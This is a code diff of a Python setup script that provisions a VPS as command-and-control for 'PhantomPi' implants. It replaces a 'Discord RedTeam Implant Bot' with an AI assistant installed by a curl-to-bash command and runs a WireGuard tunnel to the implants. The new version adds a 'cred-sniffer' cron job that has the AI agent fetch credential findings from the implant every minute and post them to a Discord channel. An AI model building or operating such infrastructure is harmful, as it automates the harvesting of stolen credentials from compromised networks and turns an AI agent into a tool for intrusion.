@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
-VPS WireGuard & Discord Bot — Automated Setup
-===================================
-Provisions a VPS to run the Discord C2 bot and WireGuard server
-for the PhantomPi implant.
+VPS WireGuard & OpenClaw — Automated Setup
+============================================
+Provisions a VPS to run the OpenClaw AI assistant (replacing the legacy
+discord.py bot) and a WireGuard server for PhantomPi implants.
 
 Usage
 -----
@@ -12,8 +12,7 @@ Usage
     sudo bash setup.sh --debug                   # verbose output
 
 The script reads deployment parameters from ``setup/init.json``
-(or a user-supplied path).  Fields left empty are skipped; a final
-summary reminds the operator what still needs attention.
+(or a user-supplied path).
 """
 
 from __future__ import annotations
@@ -27,25 +26,23 @@ import sys
 import traceback
 
 # ---------------------------------------------------------------------------
-# Path setup — works no matter where the repo was cloned
+# Path setup
 # ---------------------------------------------------------------------------
 SETUP_DIR = os.path.dirname(os.path.abspath(__file__))
 REPO_DIR  = os.path.dirname(SETUP_DIR)
 
 TOTAL_STEPS = 4
 
-# Deploy root (mirrors implant-side /opt/implant structure)
-IMPLANT_DIR  = "/opt/implant"
-DISCORD_DIR  = os.path.join(IMPLANT_DIR, "discord")
-SERVICES_DIR = os.path.join(IMPLANT_DIR, "services")
+OPENCLAW_DIR = "/opt/openclaw"
+SKILLS_DIR   = os.path.join(OPENCLAW_DIR, "skills")
+OPENCLAW_HOME = os.path.expanduser("~/.openclaw")
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-# Console UI  (lightweight copy of PhantomPi's modules/ui.py)
+# Console UI
 # ═══════════════════════════════════════════════════════════════════════════
 
 class _C:
-    """ANSI colours — stripped when stdout is not a TTY."""
     RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
     RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
     CYAN = "\033[96m"; WHITE = "\033[97m"
@@ -60,12 +57,11 @@ class UI:
         self._debug = debug_mode
         self._w = min(shutil.get_terminal_size().columns, 72)
 
-    # -- Banner ------------------------------------------------------------
     def banner(self):
         w = self._w
         print()
         print(f"{_C.CYAN}{_C.BOLD}{'=' * w}{_C.RESET}")
-        title = "VPS WireGuard & Discord Bot — Automated Setup"
+        title = "VPS WireGuard & OpenClaw — Automated Setup"
         print(f"{_C.WHITE}{_C.BOLD}{title.center(w)}{_C.RESET}")
         print(f"{_C.CYAN}{_C.BOLD}{'=' * w}{_C.RESET}")
         print()
@@ -77,7 +73,6 @@ class UI:
         print(f"{_C.CYAN}{_C.BOLD}  STEP {num}/{total} — {title}{_C.RESET}")
         print(f"{_C.CYAN}{'-' * w}{_C.RESET}")
 
-    # -- Messages ----------------------------------------------------------
     def info(self, msg):    print(f"  {_C.CYAN}[*]{_C.RESET} {msg}")
     def success(self, msg): print(f"  {_C.GREEN}[+]{_C.RESET} {msg}")
     def warning(self, msg): print(f"  {_C.YELLOW}[!]{_C.RESET} {msg}")
@@ -88,7 +83,6 @@ class UI:
         if self._debug:
             print(f"  {_C.DIM}[D] {msg}{_C.RESET}")
 
-    # -- Summary -----------------------------------------------------------
     def summary(self, skipped_items: list, failures: list):
         w = self._w
         print()
@@ -109,12 +103,11 @@ class UI:
             for i, item in enumerate(skipped_items, 1):
                 print(f"  {_C.YELLOW}{i}.{_C.RESET} {item}")
         if not failures and not skipped_items:
-            print(f"{_C.GREEN}{_C.BOLD}  Setup complete — WireGuard & Discord bot are ready!{_C.RESET}")
+            print(f"{_C.GREEN}{_C.BOLD}  Setup complete — WireGuard & OpenClaw are ready!{_C.RESET}")
         print()
         print(f"{_C.CYAN}{'=' * w}{_C.RESET}")
         print()
 
-    # -- Shell runner ------------------------------------------------------
     def run(self, cmd, *, check=True, capture=True, timeout=300):
         self.debug(f"$ {cmd}")
         try:
@@ -158,23 +151,18 @@ def _get(cfg: dict, *keys, default=None):
 
 def _validate(cfg: dict) -> list[str]:
     w: list[str] = []
-    if not _get(cfg, "discord", "bot_token"):
-        w.append("discord.bot_token is empty — bot will NOT start")
-    if not _get(cfg, "discord", "guild_id"):
-        w.append("discord.guild_id is empty — slash commands will NOT sync")
+    if not _get(cfg, "openclaw", "anthropic_api_key"):
+        w.append("openclaw.anthropic_api_key is empty — OpenClaw will NOT work")
+    if not _get(cfg, "openclaw", "discord_bot_token"):
+        w.append("openclaw.discord_bot_token is empty — Discord channel will NOT connect")
+    if not _get(cfg, "openclaw", "discord_guild_id"):
+        w.append("openclaw.discord_guild_id is empty — guild access will NOT work")
     peers = _get(cfg, "wireguard", "peers", default=[])
     has_peer = any(p.get("public_key") for p in peers)
     if not has_peer:
-        w.append(
-            "wireguard.peers has no public_key entries — no WireGuard "
-            "peers will be added (fill after running PhantomPi setup)"
-        )
+        w.append("wireguard.peers has no public_key entries — no peers will be added")
     return w
 
-
-# ═══════════════════════════════════════════════════════════════════════════
-# Fail-safe runner
-# ═══════════════════════════════════════════════════════════════════════════
 
 def _try(ui, label, fn, failures, debug):
     try:
@@ -192,13 +180,10 @@ def _try(ui, label, fn, failures, debug):
 # Step implementations
 # ═══════════════════════════════════════════════════════════════════════════
 
-# ---------------------------------------------------------------------------
-# 1. System packages
-# ---------------------------------------------------------------------------
+# ── 1. System packages ───────────────────────────────────────────────────
 
 def step_packages(ui: UI) -> None:
-    """Install required APT packages (idempotent)."""
-    pkgs = ["wireguard-tools", "python3-venv"]
+    pkgs = ["wireguard-tools", "python3-venv", "curl"]
     missing: list[str] = []
     for p in pkgs:
         r = ui.run(f"dpkg-query -W -f='${{Status}}' {p} 2>/dev/null "
@@ -216,19 +201,15 @@ def step_packages(ui: UI) -> None:
     ui.success("Packages installed")
 
 
-# ---------------------------------------------------------------------------
-# 2. WireGuard server
-# ---------------------------------------------------------------------------
+# ── 2. WireGuard server ─────────────────────────────────────────────────
 
 def step_wireguard(cfg: dict, ui: UI, skipped: list) -> bool:
-    """Configure WireGuard server interface and peer(s)."""
     wg_dir = "/etc/wireguard"
     os.makedirs(wg_dir, exist_ok=True)
 
     privkey_path = os.path.join(wg_dir, "private.key")
     pubkey_path  = os.path.join(wg_dir, "public.key")
 
-    # ── Key handling ──────────────────────────────────────────────────
     cfg_privkey = _get(cfg, "wireguard", "private_key", default="")
 
     if cfg_privkey:
@@ -252,7 +233,6 @@ def step_wireguard(cfg: dict, ui: UI, skipped: list) -> bool:
     ui.info("  -> Put this key in each implant's init.json  "
             "wireguard.server_public_key")
 
-    # ── wg0.conf ──────────────────────────────────────────────────────
     srv_addr    = _get(cfg, "wireguard", "server_address", default="10.8.0.1/24")
     listen_port = _get(cfg, "wireguard", "listen_port",    default=51820)
     peers       = _get(cfg, "wireguard", "peers",          default=[])
@@ -272,7 +252,6 @@ def step_wireguard(cfg: dict, ui: UI, skipped: list) -> bool:
         "iptables -D FORWARD -i wg0 -j ACCEPT\n"
     )
 
-    # ── Peers ─────────────────────────────────────────────────────────
     peer_count = 0
     for peer in peers:
         pub = peer.get("public_key", "").strip()
@@ -300,15 +279,11 @@ def step_wireguard(cfg: dict, ui: UI, skipped: list) -> bool:
         fh.write(conf)
     os.chmod(conf_path, 0o600)
 
-    # Enable at boot
     ui.run("systemctl enable wg-quick@wg0.service 2>/dev/null || true",
            check=False)
-
-    # Always restart to guarantee the on-disk config is active
     ui.run("systemctl restart wg-quick@wg0.service", check=False)
     ui.success("WireGuard server started")
 
-    # ── IP forwarding (for implant internet access via VPS) ──────────
     sysctl_conf = "/etc/sysctl.d/99-wireguard.conf"
     if not os.path.isfile(sysctl_conf):
         ui.info("Enabling IPv4 forwarding ...")
@@ -322,158 +297,196 @@ def step_wireguard(cfg: dict, ui: UI, skipped: list) -> bool:
     return peer_count > 0
 
 
-# ---------------------------------------------------------------------------
-# 3. Deploy Discord bot
-# ---------------------------------------------------------------------------
+# ── 3. Install OpenClaw & deploy skills ──────────────────────────────────
 
-def step_deploy(cfg: dict, ui: UI, skipped: list) -> None:
-    """Copy bot + service files, create venv, install deps, write config."""
-    discord_src  = os.path.join(REPO_DIR, "discord")
-    services_src = os.path.join(REPO_DIR, "services")
-    venv_dir     = os.path.join(DISCORD_DIR, "venv")
-    logs_dir     = os.path.join(DISCORD_DIR, "logs")
+def step_openclaw(cfg: dict, ui: UI, skipped: list) -> None:
+    """Install OpenClaw, deploy PhantomPi skills, write env/config."""
 
-    # ── Copy bot files → /opt/implant/discord/ ────────────────────────
-    if not os.path.isdir(discord_src):
-        raise FileNotFoundError(
-            f"Bot source not found at {discord_src} — "
-            f"run setup from the vps/ directory")
-
-    ui.info(f"Deploying bot files to {DISCORD_DIR} ...")
-    os.makedirs(DISCORD_DIR, exist_ok=True)
-
-    # Copy everything except venv, logs, __pycache__
-    for item in os.listdir(discord_src):
-        if item in ("venv", "logs", "__pycache__"):
-            continue
-        src = os.path.join(discord_src, item)
-        dst = os.path.join(DISCORD_DIR, item)
-        if os.path.isdir(src):
-            if os.path.isdir(dst):
-                shutil.rmtree(dst)
-            shutil.copytree(src, dst)
-        else:
-            shutil.copy2(src, dst)
-    ui.success("Bot files deployed")
-
-    # ── Copy service files → /opt/implant/services/ ───────────────────
-    os.makedirs(SERVICES_DIR, exist_ok=True)
-    if os.path.isdir(services_src):
-        for item in os.listdir(services_src):
-            src = os.path.join(services_src, item)
-            dst = os.path.join(SERVICES_DIR, item)
-            if os.path.isfile(src):
-                shutil.copy2(src, dst)
-        ui.success(f"Service files deployed to {SERVICES_DIR}")
-
-    # ── Logs directory ────────────────────────────────────────────────
-    os.makedirs(logs_dir, exist_ok=True)
-    ui.success("Logs directory ready")
-
-    # ── Python virtual environment ────────────────────────────────────
-    if not os.path.isdir(venv_dir):
-        ui.info("Creating Python virtual environment ...")
-        ui.run(f"python3 -m venv {venv_dir}", timeout=60)
-        ui.run(f"{venv_dir}/bin/pip install --upgrade pip -q", timeout=60)
-        ui.success("Virtual environment created")
-    else:
-        ui.success("Virtual environment already exists")
-
-    # Install / update dependencies
-    req_file = os.path.join(DISCORD_DIR, "requirements.txt")
-    if os.path.isfile(req_file):
-        ui.info("Installing Python dependencies ...")
-        ui.run(f"{venv_dir}/bin/pip install -r {req_file} -q", timeout=120)
-        ui.success("Dependencies installed")
-
-    # ── Write config.py with actual credentials ──────────────────────
-    token    = _get(cfg, "discord", "bot_token", default="")
-    guild_id = _get(cfg, "discord", "guild_id",  default="")
-
-    if not token:
-        skipped.append(
-            "discord.bot_token is empty — bot will not start. "
-            "Fill init.json and re-run setup."
+    # ── Install OpenClaw binary ──────────────────────────────────────
+    r = ui.run("command -v openclaw 2>/dev/null", check=False)
+    if r.returncode != 0:
+        ui.info("Installing OpenClaw ...")
+        ui.run(
+            "curl -fsSL https://openclaw.ai/install.sh | bash",
+            timeout=180,
         )
+        ui.success("OpenClaw installed")
+    else:
+        ui.success("OpenClaw already installed")
+
+    # ── Deploy skills to /opt/openclaw/skills/ ───────────────────────
+    skills_src = os.path.join(REPO_DIR, "openclaw", "skills")
+    os.makedirs(SKILLS_DIR, exist_ok=True)
+
+    if os.path.isdir(skills_src):
+        ui.info(f"Deploying OpenClaw skills to {SKILLS_DIR} ...")
+        for item in os.listdir(skills_src):
+            s = os.path.join(skills_src, item)
+            d = os.path.join(SKILLS_DIR, item)
+            if os.path.isdir(s):
+                if os.path.isdir(d):
+                    shutil.rmtree(d)
+                shutil.copytree(s, d)
+        # Make skill scripts executable
+        for root, dirs, files in os.walk(SKILLS_DIR):
+            for f in files:
+                if f.endswith(".sh"):
+                    path = os.path.join(root, f)
+                    os.chmod(path, 0o755)
+        ui.success("Skills deployed")
+    else:
+        ui.warning(f"Skills source not found at {skills_src}")
+
+    # ── Write ~/.openclaw/.env ───────────────────────────────────────
+    os.makedirs(OPENCLAW_HOME, exist_ok=True)
+
+    api_key   = _get(cfg, "openclaw", "anthropic_api_key", default="")
+    bot_token = _get(cfg, "openclaw", "discord_bot_token", default="")
+    implant   = _get(cfg, "openclaw", "implant_ip", default="10.8.0.3")
+
+    if not api_key:
+        skipped.append(
+            "openclaw.anthropic_api_key is empty — OpenClaw cannot "
+            "run. Fill init.json and re-run setup."
+        )
+    if not bot_token:
+        skipped.append(
+            "openclaw.discord_bot_token is empty — Discord channel "
+            "will not connect. Fill init.json and re-run setup."
+        )
+
+    env_path = os.path.join(OPENCLAW_HOME, ".env")
+    ui.info("Writing ~/.openclaw/.env ...")
+    with open(env_path, "w") as fh:
+        fh.write(f"ANTHROPIC_API_KEY={api_key}\n")
+        fh.write(f"DISCORD_BOT_TOKEN={bot_token}\n")
+        fh.write(f"IMPLANT_IP={implant}\n")
+    os.chmod(env_path, 0o600)
+    ui.success(".env written (permissions 600)")
+
+    # ── Write ~/.openclaw/openclaw.json ──────────────────────────────
+    guild_id   = _get(cfg, "openclaw", "discord_guild_id", default="")
+    admin_id   = _get(cfg, "openclaw", "discord_admin_user_id", default="")
+    alert_ch   = _get(cfg, "openclaw", "discord_alert_channel", default="phantompi-alerts")
+    chat_ch    = _get(cfg, "openclaw", "discord_chat_channel", default="phantompi-chat")
+
     if not guild_id:
         skipped.append(
-            "discord.guild_id is empty — slash commands will not sync. "
-            "Fill init.json and re-run setup."
+            "openclaw.discord_guild_id is empty — guild access will "
+            "not work. Fill init.json and re-run setup."
         )
 
-    ui.info("Writing config.py with credentials ...")
-    config_py = os.path.join(DISCORD_DIR, "config.py")
-    with open(config_py, "w") as fh:
-        fh.write(
-            f'DISCORD_TOKEN = "{token}"\n'
-            f'GUILD_ID = {guild_id if guild_id else "0"}\n'
-        )
-    os.chmod(config_py, 0o600)
-    ui.success("config.py written (permissions 600)")
+    # Read template and substitute
+    template_path = os.path.join(REPO_DIR, "openclaw", "openclaw.json.template")
+    if os.path.isfile(template_path):
+        with open(template_path) as fh:
+            tmpl = fh.read()
+
+        config_str = tmpl.replace("__GUILD_ID__", str(guild_id))
+        config_str = config_str.replace("__ADMIN_USER_ID__", str(admin_id))
+        config_str = config_str.replace("__ALERT_CHANNEL_NAME__", alert_ch)
+        config_str = config_str.replace("__CHAT_CHANNEL_NAME__", chat_ch)
+
+        config_path = os.path.join(OPENCLAW_HOME, "openclaw.json")
+        ui.info("Writing ~/.openclaw/openclaw.json ...")
+        with open(config_path, "w") as fh:
+            fh.write(config_str)
+        ui.success("OpenClaw config written")
+    else:
+        ui.warning("OpenClaw config template not found — create manually")
+
+    # ── Also deploy skills to ~/.openclaw/skills/ as fallback ────────
+    user_skills = os.path.join(OPENCLAW_HOME, "skills")
+    os.makedirs(user_skills, exist_ok=True)
+    if os.path.isdir(skills_src):
+        for item in os.listdir(skills_src):
+            s = os.path.join(skills_src, item)
+            d = os.path.join(user_skills, item)
+            if os.path.isdir(s):
+                if os.path.isdir(d):
+                    shutil.rmtree(d)
+                shutil.copytree(s, d)
+        for root, dirs, files in os.walk(user_skills):
+            for f in files:
+                if f.endswith(".sh"):
+                    os.chmod(os.path.join(root, f), 0o755)
+        ui.success("Skills also deployed to ~/.openclaw/skills/")
 
 
+# ── 4. Configure OpenClaw daemon & cron ──────────────────────────────────
 
-# ---------------------------------------------------------------------------
-# 4. Systemd service
-# ---------------------------------------------------------------------------
+def step_daemon(cfg: dict, ui: UI, skipped: list) -> None:
+    """Install OpenClaw daemon and set up the cred-sniffer cron job."""
 
-def step_systemd(cfg: dict, ui: UI) -> None:
-    """Write service file to /opt/implant/services/, symlink, enable."""
-    venv_dir = os.path.join(DISCORD_DIR, "venv")
-    svc_name = "discord-bot.service"
-    svc_src  = os.path.join(SERVICES_DIR, svc_name)
-    svc_link = os.path.join("/etc/systemd/system", svc_name)
-
-    # ── Write service unit to /opt/implant/services/ ──────────────────
-    ui.info(f"Writing {svc_src} ...")
-    os.makedirs(SERVICES_DIR, exist_ok=True)
-
-    svc = (
-        "[Unit]\n"
-        "Description=Discord RedTeam Implant Bot\n"
-        "After=network-online.target wg-quick@wg0.service\n"
-        "Wants=network-online.target wg-quick@wg0.service\n"
-        "\n"
-        "[Service]\n"
-        f"WorkingDirectory={DISCORD_DIR}\n"
-        f"ExecStart={venv_dir}/bin/python3 {DISCORD_DIR}/bot.py\n"
-        "Restart=always\n"
-        "RestartSec=5\n"
-        "User=root\n"
-        "\n"
-        "[Install]\n"
-        "WantedBy=multi-user.target\n"
-    )
-    with open(svc_src, "w") as fh:
-        fh.write(svc)
-
-    # ── Symlink into /etc/systemd/system/ ─────────────────────────────
-    if os.path.islink(svc_link) or os.path.exists(svc_link):
-        os.remove(svc_link)
-    os.symlink(svc_src, svc_link)
-    ui.success(f"{svc_name} -> {svc_src}")
-
-    ui.run("systemctl daemon-reload")
-    ui.run("systemctl enable discord-bot.service 2>/dev/null || true",
-           check=False)
-
-    # Restart if already running (picks up config changes)
+    # ── Stop old Discord bot if running ──────────────────────────────
     r = ui.run("systemctl is-active discord-bot.service 2>/dev/null",
                check=False)
     if r.returncode == 0:
-        ui.run("systemctl restart discord-bot.service", check=False)
-        ui.success("discord-bot.service restarted with new config")
-    else:
-        # Only start if token is present
-        token = _get(cfg, "discord", "bot_token", default="")
-        if token:
-            ui.run("systemctl start discord-bot.service", check=False)
-            ui.success("discord-bot.service started")
-        else:
-            ui.warning("discord-bot.service enabled but NOT started "
-                       "(bot_token is empty)")
+        ui.info("Stopping legacy Discord bot ...")
+        ui.run("systemctl stop discord-bot.service", check=False)
+        ui.run("systemctl disable discord-bot.service", check=False)
+        ui.run("rm -f /etc/systemd/system/discord-bot.service", check=False)
+        ui.run("systemctl daemon-reload", check=False)
+        ui.success("Legacy Discord bot stopped and disabled")
 
-    ui.success("discord-bot.service installed and enabled at boot")
+    # ── Install daemon ───────────────────────────────────────────────
+    r = ui.run("openclaw gateway status 2>/dev/null", check=False)
+    if r.returncode == 0:
+        ui.success("OpenClaw gateway already running")
+    else:
+        api_key = _get(cfg, "openclaw", "anthropic_api_key", default="")
+        if api_key:
+            ui.info("Starting OpenClaw gateway ...")
+            # Install the daemon (launchd on macOS, systemd on Linux)
+            ui.run("openclaw daemon install 2>/dev/null || true",
+                   check=False, timeout=30)
+            ui.run("openclaw daemon start 2>/dev/null || true",
+                   check=False, timeout=30)
+            ui.success("OpenClaw gateway started")
+        else:
+            skipped.append(
+                "OpenClaw gateway NOT started — API key missing. "
+                "After filling init.json and re-running setup, start with: "
+                "openclaw daemon start"
+            )
+
+    # ── Set up cred-sniffer cron job ─────────────────────────────────
+    implant_ip = _get(cfg, "openclaw", "implant_ip", default="10.8.0.3")
+    alert_ch   = _get(cfg, "openclaw", "discord_alert_channel",
+                       default="phantompi-alerts")
+
+    # Check if cron job already exists
+    r = ui.run("openclaw cron list 2>/dev/null | grep -q cred-sniffer",
+               check=False)
+    if r.returncode == 0:
+        ui.success("cred-sniffer cron job already exists")
+    else:
+        api_key = _get(cfg, "openclaw", "anthropic_api_key", default="")
+        if api_key:
+            ui.info("Creating cred-sniffer cron job (every 60s) ...")
+            ui.run(
+                f"openclaw cron add "
+                f"--name cred-sniffer "
+                f"--every 1m "
+                f"--session isolated "
+                f'--message "Run the cred-sniffer skill: use the '
+                f"check-findings.sh script to fetch credential findings "
+                f"from implant {implant_ip}. If there are new findings "
+                f'since the last check, summarise them." '
+                f"--tools exec,read "
+                f"--announce "
+                f"--channel discord",
+                check=False, timeout=30,
+            )
+            ui.success("cred-sniffer cron job created")
+        else:
+            skipped.append(
+                "cred-sniffer cron job NOT created — API key missing. "
+                "Create manually after setup with:\n"
+                "    openclaw cron add --name cred-sniffer --every 1m "
+                "--session isolated --message '...' --tools exec,read "
+                "--announce --channel discord"
+            )
 
 
 # ═══════════════════════════════════════════════════════════════════════════
@@ -483,7 +496,7 @@ def step_systemd(cfg: dict, ui: UI) -> None:
 def main() -> None:
     parser = argparse.ArgumentParser(
         prog="vps-setup",
-        description="VPS WireGuard & Discord Bot — Automated Setup",
+        description="VPS WireGuard & OpenClaw — Automated Setup",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog=(
             "examples:\n"
@@ -506,14 +519,12 @@ def main() -> None:
     ui = UI(debug_mode=args.debug)
     ui.banner()
 
-    # ── Pre-flight ────────────────────────────────────────────────────
     if os.geteuid() != 0:
         ui.error("This script must be run as root.  Use:  "
                  "sudo bash setup.sh")
         sys.exit(1)
     ui.success("Running as root")
 
-    # ── Load config ───────────────────────────────────────────────────
     ui.info(f"Loading configuration from {args.config} ...")
     try:
         cfg = _load(args.config)
@@ -536,37 +547,27 @@ def main() -> None:
     skipped:  list[str] = []
     failures: list[str] = []
 
-    # ══════════════════════════════════════════════════════════════════
-    #  STEP 1 — System Packages
-    # ══════════════════════════════════════════════════════════════════
+    # ── STEP 1 — System Packages ─────────────────────────────────────
     ui.step(1, TOTAL_STEPS, "System Packages")
     _try(ui, "Package installation",
          lambda: step_packages(ui), failures, args.debug)
 
-    # ══════════════════════════════════════════════════════════════════
-    #  STEP 2 — WireGuard Server
-    # ══════════════════════════════════════════════════════════════════
+    # ── STEP 2 — WireGuard Server ────────────────────────────────────
     ui.step(2, TOTAL_STEPS, "WireGuard Server")
     _try(ui, "WireGuard configuration",
          lambda: step_wireguard(cfg, ui, skipped), failures, args.debug)
 
-    # ══════════════════════════════════════════════════════════════════
-    #  STEP 3 — Deploy Discord Bot
-    # ══════════════════════════════════════════════════════════════════
-    ui.step(3, TOTAL_STEPS, "Deploy Discord Bot")
-    _try(ui, "Bot deployment",
-         lambda: step_deploy(cfg, ui, skipped), failures, args.debug)
+    # ── STEP 3 — Install OpenClaw & Deploy Skills ────────────────────
+    ui.step(3, TOTAL_STEPS, "Install OpenClaw & Deploy Skills")
+    _try(ui, "OpenClaw deployment",
+         lambda: step_openclaw(cfg, ui, skipped), failures, args.debug)
 
-    # ══════════════════════════════════════════════════════════════════
-    #  STEP 4 — Systemd Service
-    # ══════════════════════════════════════════════════════════════════
-    ui.step(4, TOTAL_STEPS, "Systemd Service")
-    _try(ui, "Service configuration",
-         lambda: step_systemd(cfg, ui), failures, args.debug)
+    # ── STEP 4 — Configure Daemon & Cron ─────────────────────────────
+    ui.step(4, TOTAL_STEPS, "Configure OpenClaw Daemon & Cron")
+    _try(ui, "Daemon configuration",
+         lambda: step_daemon(cfg, ui, skipped), failures, args.debug)
 
-    # ══════════════════════════════════════════════════════════════════
-    #  Summary
-    # ══════════════════════════════════════════════════════════════════
+    # ── Summary ──────────────────────────────────────────────────────
     ui.summary(skipped, failures)
 
     if failures:
@@ -580,11 +581,11 @@ def main() -> None:
     else:
         ui.info("All done.  Verify with:")
         print("    wg show")
-        print("    systemctl status discord-bot")
+        print("    openclaw gateway status")
+        print("    openclaw cron list")
         print()
 
 
-# ---------------------------------------------------------------------------
 if __name__ == "__main__":
     try:
         main()
